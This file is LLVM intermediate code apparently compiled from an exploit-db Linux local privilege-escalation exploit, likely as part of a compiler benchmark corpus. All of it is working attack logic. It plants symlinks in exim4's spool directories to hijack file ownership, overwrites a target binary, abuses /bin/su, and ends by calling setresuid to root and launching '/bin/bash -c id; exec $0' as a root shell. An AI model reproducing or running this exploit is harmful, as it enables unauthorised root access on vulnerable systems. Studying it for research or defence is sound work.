; ModuleID = '/home/carl/AnghaBench/exploitdb/exploits/linux/local/extr_40054.c_main.c'
source_filename = "/home/carl/AnghaBench/exploitdb/exploits/linux/local/extr_40054.c_main.c"
target datalayout = "e-m:e-p270:32:32-p271:32:32-p272:64:64-i64:64-f80:128-n8:16:32:64-S128"
target triple = "x86_64-unknown-linux-gnu"

%struct.dirent = type { i8* }
%struct.stat = type { i64, i32, i32, i32 }

@.str = private unnamed_addr constant [7 x i8] c"--Exec\00", align 1
@environ = common dso_local global i32 0, align 4
@stderr = common dso_local global i32 0, align 4
@.str.1 = private unnamed_addr constant [13 x i8] c"Exec failed\0A\00", align 1
@.str.2 = private unnamed_addr constant [9 x i8] c"--Repair\00", align 1
@TARGET_PATH = common dso_local global i8* null, align 8
@O_RDWR = common dso_local global i32 0, align 4
@.str.3 = private unnamed_addr constant [10 x i8] c"--Upgrade\00", align 1
@.str.4 = private unnamed_addr constant [10 x i8] c"/dev/null\00", align 1
@O_RDONLY = common dso_local global i32 0, align 4
@.str.5 = private unnamed_addr constant [19 x i8] c"/usr/sbin/sendmail\00", align 1
@.str.6 = private unnamed_addr constant [15 x i8] c"root@localhost\00", align 1
@.str.7 = private unnamed_addr constant [42 x i8] c"/var/spool/exim4/input/xxxxxx-xxxxxx-xx-J\00", align 1
@.str.8 = private unnamed_addr constant [24 x i8] c"/var/spool/exim4/msglog\00", align 1
@.str.9 = private unnamed_addr constant [13 x i8] c"Relinked %s\0A\00", align 1
@.str.10 = private unnamed_addr constant [26 x i8] c"Target ready for writing\0A\00", align 1
@UPGRADE_FILE_NAME = common dso_local global i8* null, align 8
@SEEK_SET = common dso_local global i32 0, align 4
@.str.11 = private unnamed_addr constant [8 x i8] c"/bin/su\00", align 1
@.str.12 = private unnamed_addr constant [3 x i8] c"%d\00", align 1
@.str.13 = private unnamed_addr constant [10 x i8] c"/bin/bash\00", align 1
@.str.14 = private unnamed_addr constant [3 x i8] c"-c\00", align 1
@.str.15 = private unnamed_addr constant [12 x i8] c"id; exec $0\00", align 1
@.str.16 = private unnamed_addr constant [38 x i8] c"Usage: %s --Upgrade or --Exec [args]\0A\00", align 1

; Function Attrs: noinline nounwind optnone uwtable
define dso_local i32 @main(i32 %0, i8** %1) #0 {
  %3 = alloca i32, align 4
  %4 = alloca i32, align 4
  %5 = alloca i8**, align 8
  %6 = alloca i32*, align 8
  %7 = alloca %struct.dirent*, align 8
  %8 = alloca [1024 x i8], align 16
  %9 = alloca i32, align 4
  %10 = alloca i32, align 4
  %11 = alloca %struct.stat, align 8
  %12 = alloca [6 x i8*], align 16
  %13 = alloca i32, align 4
  %14 = alloca i32, align 4
  %15 = alloca %struct.stat, align 8
  %16 = alloca i32, align 4
  %17 = alloca i8*, align 8
  %18 = alloca %struct.stat, align 8
  %19 = alloca i8*, align 8
  %20 = alloca i32, align 4
  %21 = alloca [128 x i8], align 16
  %22 = alloca i8*, align 8
  store i32 0, i32* %3, align 4
  store i32 %0, i32* %4, align 4
  store i8** %1, i8*** %5, align 8
  %23 = load i32, i32* %4, align 4
  %24 = icmp sgt i32 %23, 1
  %25 = zext i1 %24 to i32
  %26 = call i32 @assert(i32 %25)
  %27 = load i8**, i8*** %5, align 8
  %28 = getelementptr inbounds i8*, i8** %27, i64 1
  %29 = load i8*, i8** %28, align 8
  %30 = call i32 @strcmp(i8* %29, i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str, i64 0, i64 0))
  %31 = icmp ne i32 %30, 0
  br i1 %31, label %44, label %32

32:                                               ; preds = %2
  %33 = call i32 @setresgid(i32 0, i32 0, i32 0)
  %34 = call i32 @setresuid(i32 0, i32 0, i32 0)
  %35 = load i8**, i8*** %5, align 8
  %36 = getelementptr inbounds i8*, i8** %35, i64 2
  %37 = load i8*, i8** %36, align 8
  %38 = load i8**, i8*** %5, align 8
  %39 = getelementptr inbounds i8*, i8** %38, i64 2
  %40 = load i32, i32* @environ, align 4
  %41 = call i32 @execve(i8* %37, i8** %39, i32 %40)
  %42 = load i32, i32* @stderr, align 4
  %43 = call i32 (i32, i8*, ...) @fprintf(i32 %42, i8* getelementptr inbounds ([13 x i8], [13 x i8]* @.str.1, i64 0, i64 0))
  store i32 1, i32* %3, align 4
  br label %334

44:                                               ; preds = %2
  %45 = load i8**, i8*** %5, align 8
  %46 = getelementptr inbounds i8*, i8** %45, i64 1
  %47 = load i8*, i8** %46, align 8
  %48 = call i32 @strcmp(i8* %47, i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.2, i64 0, i64 0))
  %49 = icmp ne i32 %48, 0
  br i1 %49, label %79, label %50

50:                                               ; preds = %44
  %51 = load i8*, i8** @TARGET_PATH, align 8
  %52 = load i32, i32* @O_RDWR, align 4
  %53 = call i32 @open(i8* %51, i32 %52)
  store i32 %53, i32* %10, align 4
  %54 = load i32, i32* %10, align 4
  %55 = icmp sge i32 %54, 0
  %56 = zext i1 %55 to i32
  %57 = call i32 @assert(i32 %56)
  %58 = load i8*, i8** @TARGET_PATH, align 8
  %59 = load i8**, i8*** %5, align 8
  %60 = getelementptr inbounds i8*, i8** %59, i64 2
  %61 = load i8*, i8** %60, align 8
  %62 = call i32 @atoi(i8* %61)
  %63 = load i8**, i8*** %5, align 8
  %64 = getelementptr inbounds i8*, i8** %63, i64 3
  %65 = load i8*, i8** %64, align 8
  %66 = call i32 @atoi(i8* %65)
  %67 = call i32 @chown(i8* %58, i32 %62, i32 %66)
  store i32 %67, i32* %9, align 4
  %68 = load i32, i32* %9, align 4
  %69 = icmp ne i32 %68, 0
  %70 = xor i1 %69, true
  %71 = zext i1 %70 to i32
  %72 = call i32 @assert(i32 %71)
  %73 = load i8*, i8** @TARGET_PATH, align 8
  %74 = load i8**, i8*** %5, align 8
  %75 = getelementptr inbounds i8*, i8** %74, i64 4
  %76 = load i8*, i8** %75, align 8
  %77 = call i32 @atoi(i8* %76)
  %78 = call i32 @chmod(i8* %73, i32 %77)
  store i32 0, i32* %3, align 4
  br label %334

79:                                               ; preds = %44
  %80 = load i8**, i8*** %5, align 8
  %81 = getelementptr inbounds i8*, i8** %80, i64 1
  %82 = load i8*, i8** %81, align 8
  %83 = call i32 @strcmp(i8* %82, i8* getelementptr inbounds ([10 x i8], [10 x i8]* @.str.3, i64 0, i64 0))
  %84 = icmp ne i32 %83, 0
  br i1 %84, label %328, label %85

85:                                               ; preds = %79
  %86 = load i8*, i8** @TARGET_PATH, align 8
  %87 = call i32 @stat(i8* %86, %struct.stat* %11)
  %88 = call i32 (...) @fork()
  store i32 %88, i32* %13, align 4
  %89 = load i32, i32* %13, align 4
  %90 = icmp ne i32 %89, 0
  br i1 %90, label %109, label %91

91:                                               ; preds = %85
  %92 = load i32, i32* @O_RDONLY, align 4
  %93 = call i32 @open(i8* getelementptr inbounds ([10 x i8], [10 x i8]* @.str.4, i64 0, i64 0), i32 %92)
  store i32 %93, i32* %14, align 4
  %94 = load i32, i32* %14, align 4
  %95 = call i32 @dup2(i32 %94, i32 0)
  %96 = getelementptr inbounds [6 x i8*], [6 x i8*]* %12, i64 0, i64 0
  store i8* getelementptr inbounds ([19 x i8], [19 x i8]* @.str.5, i64 0, i64 0), i8** %96, align 16
  %97 = getelementptr inbounds [6 x i8*], [6 x i8*]* %12, i64 0, i64 1
  store i8* getelementptr inbounds ([15 x i8], [15 x i8]* @.str.6, i64 0, i64 0), i8** %97, align 8
  %98 = getelementptr inbounds [6 x i8*], [6 x i8*]* %12, i64 0, i64 2
  store i8* null, i8** %98, align 16
  %99 = getelementptr inbounds [6 x i8*], [6 x i8*]* %12, i64 0, i64 0
  %100 = load i8*, i8** %99, align 16
  %101 = getelementptr inbounds [6 x i8*], [6 x i8*]* %12, i64 0, i64 0
  %102 = load i32, i32* @environ, align 4
  %103 = call i32 @execve(i8* %100, i8** %101, i32 %102)
  store i32 %103, i32* %9, align 4
  %104 = load i32, i32* %9, align 4
  %105 = icmp ne i32 %104, 0
  %106 = xor i1 %105, true
  %107 = zext i1 %106 to i32
  %108 = call i32 @assert(i32 %107)
  store i32 0, i32* %3, align 4
  br label %334

109:                                              ; preds = %85
  %110 = getelementptr inbounds [1024 x i8], [1024 x i8]* %8, i64 0, i64 0
  %111 = call i32 @strcpy(i8* %110, i8* getelementptr inbounds ([42 x i8], [42 x i8]* @.str.7, i64 0, i64 0))
  %112 = call i32* @opendir(i8* getelementptr inbounds ([24 x i8], [24 x i8]* @.str.8, i64 0, i64 0))
  store i32* %112, i32** %6, align 8
  %113 = load i32*, i32** %6, align 8
  %114 = ptrtoint i32* %113 to i32
  %115 = call i32 @assert(i32 %114)
  store i32 1, i32* %9, align 4
  br label %116

116:                                              ; preds = %150, %109
  %117 = load i32, i32* %9, align 4
  %118 = icmp ne i32 %117, 0
  br i1 %118, label %119, label %153

119:                                              ; preds = %116
  br label %120

120:                                              ; preds = %131, %119
  %121 = load i32*, i32** %6, align 8
  %122 = call %struct.dirent* @readdir(i32* %121)
  store %struct.dirent* %122, %struct.dirent** %7, align 8
  %123 = icmp ne %struct.dirent* %122, null
  br i1 %123, label %124, label %150

124:                                              ; preds = %120
  %125 = load %struct.dirent*, %struct.dirent** %7, align 8
  %126 = getelementptr inbounds %struct.dirent, %struct.dirent* %125, i32 0, i32 0
  %127 = load i8*, i8** %126, align 8
  %128 = load i8, i8* %127, align 1
  %129 = sext i8 %128 to i32
  %130 = icmp eq i32 %129, 46
  br i1 %130, label %131, label %132

131:                                              ; preds = %124
  br label %120

132:                                              ; preds = %124
  %133 = getelementptr inbounds [1024 x i8], [1024 x i8]* %8, i64 0, i64 0
  %134 = getelementptr inbounds i8, i8* %133, i64 23
  %135 = load %struct.dirent*, %struct.dirent** %7, align 8
  %136 = getelementptr inbounds %struct.dirent, %struct.dirent* %135, i32 0, i32 0
  %137 = load i8*, i8** %136, align 8
  %138 = call i32 @strncpy(i8* %134, i8* %137, i32 16)
  %139 = load i8*, i8** @TARGET_PATH, align 8
  %140 = getelementptr inbounds [1024 x i8], [1024 x i8]* %8, i64 0, i64 0
  %141 = call i32 @symlink(i8* %139, i8* %140)
  store i32 %141, i32* %9, align 4
  %142 = load i32, i32* %9, align 4
  %143 = icmp ne i32 %142, 0
  %144 = xor i1 %143, true
  %145 = zext i1 %144 to i32
  %146 = call i32 @assert(i32 %145)
  %147 = load i32, i32* @stderr, align 4
  %148 = getelementptr inbounds [1024 x i8], [1024 x i8]* %8, i64 0, i64 0
  %149 = call i32 (i32, i8*, ...) @fprintf(i32 %147, i8* getelementptr inbounds ([13 x i8], [13 x i8]* @.str.9, i64 0, i64 0), i8* %148)
  br label %150

150:                                              ; preds = %132, %120
  %151 = load i32*, i32** %6, align 8
  %152 = call i32 @rewinddir(i32* %151)
  br label %116

153:                                              ; preds = %116
  %154 = load i32*, i32** %6, align 8
  %155 = call i32 @closedir(i32* %154)
  br label %156

156:                                              ; preds = %153, %165
  %157 = load i8*, i8** @TARGET_PATH, align 8
  %158 = call i32 @stat(i8* %157, %struct.stat* %15)
  %159 = getelementptr inbounds %struct.stat, %struct.stat* %15, i32 0, i32 0
  %160 = load i64, i64* %159, align 8
  %161 = getelementptr inbounds %struct.stat, %struct.stat* %11, i32 0, i32 0
  %162 = load i64, i64* %161, align 8
  %163 = icmp ne i64 %160, %162
  br i1 %163, label %164, label %165

164:                                              ; preds = %156
  br label %167

165:                                              ; preds = %156
  %166 = call i32 @sleep(i32 1)
  br label %156

167:                                              ; preds = %164
  %168 = load i32, i32* %13, align 4
  %169 = call i32 @waitpid(i32 %168, i32* null, i32 0)
  %170 = load i32, i32* @stderr, align 4
  %171 = call i32 (i32, i8*, ...) @fprintf(i32 %170, i8* getelementptr inbounds ([26 x i8], [26 x i8]* @.str.10, i64 0, i64 0))
  %172 = load i8*, i8** @TARGET_PATH, align 8
  %173 = load i32, i32* @O_RDWR, align 4
  %174 = call i32 @open(i8* %172, i32 %173)
  store i32 %174, i32* %16, align 4
  %175 = load i32, i32* %16, align 4
  %176 = icmp sge i32 %175, 0
  %177 = zext i1 %176 to i32
  %178 = call i32 @assert(i32 %177)
  %179 = getelementptr inbounds %struct.stat, %struct.stat* %11, i32 0, i32 1
  %180 = load i32, i32* %179, align 8
  %181 = call i64 @malloc(i32 %180)
  %182 = inttoptr i64 %181 to i8*
  store i8* %182, i8** %17, align 8
  %183 = load i32, i32* %16, align 4
  %184 = load i8*, i8** %17, align 8
  %185 = getelementptr inbounds %struct.stat, %struct.stat* %11, i32 0, i32 1
  %186 = load i32, i32* %185, align 8
  %187 = call i32 @read(i32 %183, i8* %184, i32 %186)
  store i32 %187, i32* %9, align 4
  %188 = load i32, i32* %9, align 4
  %189 = getelementptr inbounds %struct.stat, %struct.stat* %11, i32 0, i32 1
  %190 = load i32, i32* %189, align 8
  %191 = icmp eq i32 %188, %190
  %192 = zext i1 %191 to i32
  %193 = call i32 @assert(i32 %192)
  %194 = load i8*, i8** @UPGRADE_FILE_NAME, align 8
  %195 = call i32 @stat(i8* %194, %struct.stat* %18)
  %196 = getelementptr inbounds %struct.stat, %struct.stat* %18, i32 0, i32 1
  %197 = load i32, i32* %196, align 8
  %198 = call i64 @malloc(i32 %197)
  %199 = inttoptr i64 %198 to i8*
  store i8* %199, i8** %19, align 8
  %200 = load i8*, i8** @UPGRADE_FILE_NAME, align 8
  %201 = load i32, i32* @O_RDONLY, align 4
  %202 = call i32 @open(i8* %200, i32 %201)
  store i32 %202, i32* %20, align 4
  %203 = load i32, i32* %20, align 4
  %204 = load i8*, i8** %19, align 8
  %205 = getelementptr inbounds %struct.stat, %struct.stat* %18, i32 0, i32 1
  %206 = load i32, i32* %205, align 8
  %207 = call i32 @read(i32 %203, i8* %204, i32 %206)
  store i32 %207, i32* %9, align 4
  %208 = load i32, i32* %9, align 4
  %209 = getelementptr inbounds %struct.stat, %struct.stat* %18, i32 0, i32 1
  %210 = load i32, i32* %209, align 8
  %211 = icmp eq i32 %208, %210
  %212 = zext i1 %211 to i32
  %213 = call i32 @assert(i32 %212)
  %214 = load i32, i32* %20, align 4
  %215 = call i32 @close(i32 %214)
  %216 = load i32, i32* %16, align 4
  %217 = call i32 @ftruncate(i32 %216, i32 0)
  %218 = load i32, i32* %16, align 4
  %219 = load i32, i32* @SEEK_SET, align 4
  %220 = call i32 @lseek(i32 %218, i32 0, i32 %219)
  %221 = load i32, i32* %16, align 4
  %222 = load i8*, i8** %19, align 8
  %223 = getelementptr inbounds %struct.stat, %struct.stat* %18, i32 0, i32 1
  %224 = load i32, i32* %223, align 8
  %225 = call i32 @write(i32 %221, i8* %222, i32 %224)
  store i32 %225, i32* %9, align 4
  %226 = load i32, i32* %9, align 4
  %227 = getelementptr inbounds %struct.stat, %struct.stat* %18, i32 0, i32 1
  %228 = load i32, i32* %227, align 8
  %229 = icmp eq i32 %226, %228
  %230 = zext i1 %229 to i32
  %231 = call i32 @assert(i32 %230)
  %232 = load i32, i32* %16, align 4
  %233 = call i32 @fsync(i32 %232)
  %234 = call i32 (...) @fork()
  store i32 %234, i32* %13, align 4
  %235 = load i32, i32* %13, align 4
  %236 = icmp ne i32 %235, 0
  br i1 %236, label %250, label %237

237:                                              ; preds = %167
  %238 = getelementptr inbounds [6 x i8*], [6 x i8*]* %12, i64 0, i64 0
  store i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.11, i64 0, i64 0), i8** %238, align 16
  %239 = getelementptr inbounds [6 x i8*], [6 x i8*]* %12, i64 0, i64 1
  store i8* null, i8** %239, align 8
  %240 = getelementptr inbounds [6 x i8*], [6 x i8*]* %12, i64 0, i64 0
  %241 = load i8*, i8** %240, align 16
  %242 = getelementptr inbounds [6 x i8*], [6 x i8*]* %12, i64 0, i64 0
  %243 = load i32, i32* @environ, align 4
  %244 = call i32 @execve(i8* %241, i8** %242, i32 %243)
  store i32 %244, i32* %9, align 4
  %245 = load i32, i32* %9, align 4
  %246 = icmp ne i32 %245, 0
  %247 = xor i1 %246, true
  %248 = zext i1 %247 to i32
  %249 = call i32 @assert(i32 %248)
  store i32 0, i32* %3, align 4
  br label %334

250:                                              ; preds = %167
  %251 = load i32, i32* %13, align 4
  %252 = call i32 @waitpid(i32 %251, i32* null, i32 0)
  %253 = load i32, i32* %16, align 4
  %254 = call i32 @ftruncate(i32 %253, i32 0)
  %255 = load i32, i32* %16, align 4
  %256 = load i32, i32* @SEEK_SET, align 4
  %257 = call i32 @lseek(i32 %255, i32 0, i32 %256)
  %258 = load i32, i32* %16, align 4
  %259 = load i8*, i8** %17, align 8
  %260 = getelementptr inbounds %struct.stat, %struct.stat* %11, i32 0, i32 1
  %261 = load i32, i32* %260, align 8
  %262 = call i32 @write(i32 %258, i8* %259, i32 %261)
  store i32 %262, i32* %9, align 4
  %263 = load i32, i32* %16, align 4
  %264 = call i32 @close(i32 %263)
  %265 = call i32 (...) @fork()
  store i32 %265, i32* %13, align 4
  %266 = load i32, i32* %13, align 4
  %267 = icmp ne i32 %266, 0
  br i1 %267, label %313, label %268

268:                                              ; preds = %250
  %269 = getelementptr inbounds [128 x i8], [128 x i8]* %21, i64 0, i64 0
  store i8* %269, i8** %22, align 8
  %270 = load i8*, i8** @UPGRADE_FILE_NAME, align 8
  %271 = getelementptr inbounds [6 x i8*], [6 x i8*]* %12, i64 0, i64 0
  store i8* %270, i8** %271, align 16
  %272 = getelementptr inbounds [6 x i8*], [6 x i8*]* %12, i64 0, i64 1
  store i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.2, i64 0, i64 0), i8** %272, align 8
  %273 = load i8*, i8** %22, align 8
  %274 = getelementptr inbounds %struct.stat, %struct.stat* %11, i32 0, i32 0
  %275 = load i64, i64* %274, align 8
  %276 = trunc i64 %275 to i32
  %277 = call i32 @sprintf(i8* %273, i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.12, i64 0, i64 0), i32 %276)
  store i32 %277, i32* %9, align 4
  %278 = load i8*, i8** %22, align 8
  %279 = getelementptr inbounds [6 x i8*], [6 x i8*]* %12, i64 0, i64 2
  store i8* %278, i8** %279, align 16
  %280 = load i32, i32* %9, align 4
  %281 = add nsw i32 %280, 1
  %282 = load i8*, i8** %22, align 8
  %283 = sext i32 %281 to i64
  %284 = getelementptr inbounds i8, i8* %282, i64 %283
  store i8* %284, i8** %22, align 8
  %285 = load i8*, i8** %22, align 8
  %286 = getelementptr inbounds %struct.stat, %struct.stat* %11, i32 0, i32 2
  %287 = load i32, i32* %286, align 4
  %288 = call i32 @sprintf(i8* %285, i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.12, i64 0, i64 0), i32 %287)
  store i32 %288, i32* %9, align 4
  %289 = load i8*, i8** %22, align 8
  %290 = getelementptr inbounds [6 x i8*], [6 x i8*]* %12, i64 0, i64 3
  store i8* %289, i8** %290, align 8
  %291 = load i32, i32* %9, align 4
  %292 = add nsw i32 %291, 1
  %293 = load i8*, i8** %22, align 8
  %294 = sext i32 %292 to i64
  %295 = getelementptr inbounds i8, i8* %293, i64 %294
  store i8* %295, i8** %22, align 8
  %296 = load i8*, i8** %22, align 8
  %297 = getelementptr inbounds %struct.stat, %struct.stat* %11, i32 0, i32 3
  %298 = load i32, i32* %297, align 8
  %299 = call i32 @sprintf(i8* %296, i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.12, i64 0, i64 0), i32 %298)
  store i32 %299, i32* %9, align 4
  %300 = load i8*, i8** %22, align 8
  %301 = getelementptr inbounds [6 x i8*], [6 x i8*]* %12, i64 0, i64 4
  store i8* %300, i8** %301, align 16
  %302 = getelementptr inbounds [6 x i8*], [6 x i8*]* %12, i64 0, i64 5
  store i8* null, i8** %302, align 8
  %303 = getelementptr inbounds [6 x i8*], [6 x i8*]* %12, i64 0, i64 0
  %304 = load i8*, i8** %303, align 16
  %305 = getelementptr inbounds [6 x i8*], [6 x i8*]* %12, i64 0, i64 0
  %306 = load i32, i32* @environ, align 4
  %307 = call i32 @execve(i8* %304, i8** %305, i32 %306)
  store i32 %307, i32* %9, align 4
  %308 = load i32, i32* %9, align 4
  %309 = icmp ne i32 %308, 0
  %310 = xor i1 %309, true
  %311 = zext i1 %310 to i32
  %312 = call i32 @assert(i32 %311)
  store i32 0, i32* %3, align 4
  br label %334

313:                                              ; preds = %250
  %314 = load i32, i32* %13, align 4
  %315 = call i32 @waitpid(i32 %314, i32* null, i32 0)
  %316 = load i8*, i8** @UPGRADE_FILE_NAME, align 8
  %317 = getelementptr inbounds [6 x i8*], [6 x i8*]* %12, i64 0, i64 0
  store i8* %316, i8** %317, align 16
  %318 = getelementptr inbounds [6 x i8*], [6 x i8*]* %12, i64 0, i64 1
  store i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str, i64 0, i64 0), i8** %318, align 8
  %319 = getelementptr inbounds [6 x i8*], [6 x i8*]* %12, i64 0, i64 2
  store i8* getelementptr inbounds ([10 x i8], [10 x i8]* @.str.13, i64 0, i64 0), i8** %319, align 16
  %320 = getelementptr inbounds [6 x i8*], [6 x i8*]* %12, i64 0, i64 3
  store i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.14, i64 0, i64 0), i8** %320, align 8
  %321 = getelementptr inbounds [6 x i8*], [6 x i8*]* %12, i64 0, i64 4
  store i8* getelementptr inbounds ([12 x i8], [12 x i8]* @.str.15, i64 0, i64 0), i8** %321, align 16
  %322 = getelementptr inbounds [6 x i8*], [6 x i8*]* %12, i64 0, i64 5
  store i8* null, i8** %322, align 8
  %323 = getelementptr inbounds [6 x i8*], [6 x i8*]* %12, i64 0, i64 0
  %324 = load i8*, i8** %323, align 16
  %325 = getelementptr inbounds [6 x i8*], [6 x i8*]* %12, i64 0, i64 0
  %326 = load i32, i32* @environ, align 4
  %327 = call i32 @execve(i8* %324, i8** %325, i32 %326)
  store i32 1, i32* %3, align 4
  br label %334

328:                                              ; preds = %79
  %329 = load i32, i32* @stderr, align 4
  %330 = load i8**, i8*** %5, align 8
  %331 = getelementptr inbounds i8*, i8** %330, i64 0
  %332 = load i8*, i8** %331, align 8
  %333 = call i32 (i32, i8*, ...) @fprintf(i32 %329, i8* getelementptr inbounds ([38 x i8], [38 x i8]* @.str.16, i64 0, i64 0), i8* %332)
  store i32 1, i32* %3, align 4
  br label %334

334:                                              ; preds = %328, %313, %268, %237, %91, %50, %32
  %335 = load i32, i32* %3, align 4
  ret i32 %335
}

declare dso_local i32 @assert(i32) #1

declare dso_local i32 @strcmp(i8*, i8*) #1

declare dso_local i32 @setresgid(i32, i32, i32) #1

declare dso_local i32 @setresuid(i32, i32, i32) #1

declare dso_local i32 @execve(i8*, i8**, i32) #1

declare dso_local i32 @fprintf(i32, i8*, ...) #1

declare dso_local i32 @open(i8*, i32) #1

declare dso_local i32 @chown(i8*, i32, i32) #1

declare dso_local i32 @atoi(i8*) #1

declare dso_local i32 @chmod(i8*, i32) #1

declare dso_local i32 @stat(i8*, %struct.stat*) #1

declare dso_local i32 @fork(...) #1

declare dso_local i32 @dup2(i32, i32) #1

declare dso_local i32 @strcpy(i8*, i8*) #1

declare dso_local i32* @opendir(i8*) #1

declare dso_local %struct.dirent* @readdir(i32*) #1

declare dso_local i32 @strncpy(i8*, i8*, i32) #1

declare dso_local i32 @symlink(i8*, i8*) #1

declare dso_local i32 @rewinddir(i32*) #1

declare dso_local i32 @closedir(i32*) #1

declare dso_local i32 @sleep(i32) #1

declare dso_local i32 @waitpid(i32, i32*, i32) #1

declare dso_local i64 @malloc(i32) #1

declare dso_local i32 @read(i32, i8*, i32) #1

declare dso_local i32 @close(i32) #1

declare dso_local i32 @ftruncate(i32, i32) #1

declare dso_local i32 @lseek(i32, i32, i32) #1

declare dso_local i32 @write(i32, i8*, i32) #1

declare dso_local i32 @fsync(i32) #1

declare dso_local i32 @sprintf(i8*, i8*, i32) #1

attributes #0 = { noinline nounwind optnone uwtable "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "min-legal-vector-width"="0" "no-infs-fp-math"="false" "no-jump-tables"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #1 = { "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }

!llvm.module.flags = !{!0}
!llvm.ident = !{!1}

!0 = !{i32 1, !"wchar_size", i32 4}
!1 = !{!"clang version 10.0.1 (https://github.com/wsmoses/llvm-project-tok c8e5003577614e72d6d18a216e6a09771e1fcce4)"}
